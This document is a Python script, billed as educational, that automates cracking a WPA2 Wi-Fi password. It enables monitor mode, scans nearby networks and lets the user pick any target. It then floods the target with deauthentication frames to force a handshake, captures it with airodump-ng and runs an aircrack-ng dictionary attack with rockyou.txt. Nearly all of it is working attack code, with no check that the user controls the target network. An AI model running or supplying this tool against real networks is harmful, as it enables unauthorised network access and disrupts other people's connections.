#!/usr/bin/env python3
"""
OMN1_WPA_AUTOCRACK_EDU  v3.5-EN
Author : mgledev (2025) – educational use only

This version prints *educational* explanations at each step so that
students understand what is happening (monitor-mode, passive scan,
handshake capture, dictionary attack, cleanup).
"""

import os, sys, time, shutil, subprocess, tempfile, csv, pathlib
from scapy.all import *

# -------------------------------------------------------------------------- #
# GLOBAL SETTINGS                                                            #
# -------------------------------------------------------------------------- #
CAP_BASENAME = "handshake/handshake"              # where .cap will be saved
WORDLIST     = "/home/mgledev/wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt"
DEAUTH_PKTS  = "20"                               # number of deauth frames

# runtime globals
iface = mon_iface = ""
target_bssid = target_ch = ""
p_capture = p_deauth = None


# -------------------------------------------------------------------------- #
# 0. UTILITY FUNCTIONS                                                       #
# -------------------------------------------------------------------------- #
def term(cmd: str):
    """Launch cmd in Konsole (preferred) or XTerm and keep shell open."""
    if shutil.which("konsole"):
        return ["konsole", "--hide-menubar", "--noclose",
                "-e", "bash", "-c", f"{cmd}; exec bash"]
    if shutil.which("xterm"):
        return ["xterm", "-hold", "-e", cmd]
    sys.exit("[-] No Konsole / XTerm found – install one.")


def open_win(cmd: str):
    """Open command in new GUI terminal, silence its stdout/err."""
    return subprocess.Popen(term(cmd),
                             stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL)


def run_q(cmd):
    """Run command quietly (redirect all output)."""
    subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def banner():
    os.system("clear")
    print(r"""
 ██████╗ ███╗   ███╗███╗   ██╗ ██╗
██╔═══██╗████╗ ████║████╗  ██║███║
██║   ██║██╔████╔██║██╔██╗ ██║╚██║
██║   ██║██║╚██╔╝██║██║╚██╗██║ ██║
╚██████╔╝██║ ╚═╝ ██║██║ ╚████║ ██║
 ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═══╝ ╚═╝  WPA AUTO HANDSHAKE CRACK EDUCATIONAL by 0xgle
""")


def get_ifaces():
    """Return list of wireless interfaces reported by iw."""
    return subprocess.check_output(
        "iw dev | awk '$1==\"Interface\"{print $2}'",
        shell=True, text=True
    ).splitlines()


# -------------------------------------------------------------------------- #
# 1. DETECT WIRELESS INTERFACE                                               #
# -------------------------------------------------------------------------- #
def detect_iface():
    global iface
    iface_list = get_ifaces()
    if not iface_list:
        sys.exit("[-] No Wi-Fi interface detected.")
    iface = iface_list[0]
    print(f"[1] Detected adapter  →  {iface}")
    print("    (we will switch it to monitor mode in the next step)")


# -------------------------------------------------------------------------- #
# 2. ENABLE MONITOR MODE                                                     #
# -------------------------------------------------------------------------- #
def enable_monitor():
    """Put interface into monitor mode so we can sniff every frame."""
    global mon_iface
    if iface.endswith("mon"):
        mon_iface = iface
        print("[2] Adapter is already in monitor mode – good!")
        return

    print("[2] Enabling monitor mode (opens a window with airmon-ng)…")
    open_win(f"airmon-ng check kill && airmon-ng start {iface}")
    time.sleep(4)                                     # wait for airmon-ng

    # find newly created <iface>mon
    for i in get_ifaces():
        if i.startswith(iface) and i != iface:
            mon_iface = i
            break
    if not mon_iface:
        sys.exit("[-] Failed to find monitor interface – airmon-ng error.")
    print(f"    Monitor interface  →  {mon_iface}")


# -------------------------------------------------------------------------- #
# 3. 10-SECOND PASSIVE SURVEY                                                #
# -------------------------------------------------------------------------- #
def auto_survey():
    """
    Run airodump-ng for 10 s, write CSV next to script,
    then display BSSID / channel / encryption / ESSID.
    """
    print("\n[3] Passive scan (sniffing beacons for 10 seconds)…")
    tmp = tempfile.NamedTemporaryFile(delete=False, prefix="survey_", dir=".")
    tmp.close()

    proc = subprocess.Popen([
        "airodump-ng", "--write", tmp.name,
        "--write-interval", "1", "--output-format", "csv",
        mon_iface
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    time.sleep(10)
    proc.terminate(); proc.wait(timeout=3)

    csv_path = pathlib.Path(f"{tmp.name}-01.csv")
    print(f"[INFO] Raw CSV saved as: {csv_path}")
    nets = []
    if csv_path.exists():
        with open(csv_path, encoding="utf8", errors="ignore") as f:
            for row in csv.reader(f):
                # row[0]=BSSID, row[3]=CH, row[5]=ENC, row[13]=ESSID
                if len(row) > 13 and row[0] and row[0] != "BSSID":
                    nets.append((row[0].strip(), row[3].strip(),
                                 row[5].strip(), row[13].strip()))
        csv_path.unlink(missing_ok=True)

    if not nets:
        sys.exit("[-] No beacons captured – run script again.")

    print("\n╔══ Nr │ BSSID              │ CH │ ENC │ ESSID ══════════╗")
    for i, (b, c, enc, essid) in enumerate(nets, 1):
        print(f"{i:>3}. {b}   {c:<2}  {enc:<4} {essid}")
    print("╚════════════════════════════════════════════════════════╝")
    print("→ Choose a WPA2-PSK network (ENC column ‘WPA2’).")
    return nets


# -------------------------------------------------------------------------- #
# 4. USER PICKS TARGET AP                                                    #
# -------------------------------------------------------------------------- #
def choose_target(nets):
    """Allow student to select by number or paste custom BSSID."""
    global target_bssid, target_ch
    choice = input("\n[4] Enter number or paste BSSID : ").strip()
    if choice.isdigit():
        idx = int(choice) - 1
        if idx not in range(len(nets)):
            sys.exit("[-] Invalid number.")
        target_bssid, target_ch, _, _ = nets[idx]
    else:
        target_bssid = choice
        target_ch = input("    Channel (CH) : ").strip()

    print(f"    Target set →  BSSID {target_bssid}  on CH {target_ch}")


# -------------------------------------------------------------------------- #
# 5. OPEN CAPTURE & DEAUTH WINDOWS                                           #
# -------------------------------------------------------------------------- #
def attack():
    """Start handshake capture & deauth flood in two side windows."""
    global p_capture, p_deauth
    print("\n[5] Two helper windows opening:")
    print("    • airodump-ng (captures handshake)")
    print("    • aireplay-ng (sends deauth to force clients to reconnect)")
    p_capture = open_win(
        f"airodump-ng -c {target_ch} --bssid {target_bssid} "
        f"-w {CAP_BASENAME} {mon_iface}"
    )
    time.sleep(2)
    p_deauth = open_win(
        f"aireplay-ng --deauth {DEAUTH_PKTS} -a {target_bssid} {mon_iface}"
    )
    print(">>> Watch the airodump window – wait for “WPA handshake: …”")
    input(">>> Then press ENTER here to continue … ")


# -------------------------------------------------------------------------- #
# 6. CRACK THE HANDSHAKE                                                     #
# -------------------------------------------------------------------------- #
def crack():
    cap = f"{CAP_BASENAME}-01.cap"
    if not os.path.exists(cap):
        sys.exit("[-] .cap missing – handshake was not captured.")
    if not os.path.exists(WORDLIST):
        sys.exit(f"[-] Wordlist missing: {WORDLIST}")

    print("\n[6] Launching dictionary attack with aircrack-ng …")
    print(f"    Wordlist → {WORDLIST}\n")
    subprocess.run(["aircrack-ng", "-a2", "-b", target_bssid,
                    "-w", WORDLIST, cap])


# -------------------------------------------------------------------------- #
# 7. CLEANUP                                                                 #
# -------------------------------------------------------------------------- #
def cleanup():
    print("\n[7] Cleaning up – stopping monitor mode & restoring Wi-Fi …")
    for p in (p_capture, p_deauth):
        try:
            if p: p.terminate()
        except: pass
    if mon_iface and not mon_iface.endswith("mon"):
        run_q(["airmon-ng", "stop", mon_iface])
    run_q(["systemctl", "start", "NetworkManager"])
    input("[✔] Demo finished – press ENTER to exit. ")

# -------------------------------------------------------------------------- #
# MAIN FLOW                                                                  #
# -------------------------------------------------------------------------- #
def main():
    banner()
    detect_iface()
    enable_monitor()
    nets = auto_survey()
    choose_target(nets)
    attack()
    crack()
    cleanup()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        if mon_iface and mon_iface != iface:
            run_q(["airmon-ng", "stop", mon_iface])
        sys.exit("\n[✖] Interrupted – interface restored.")
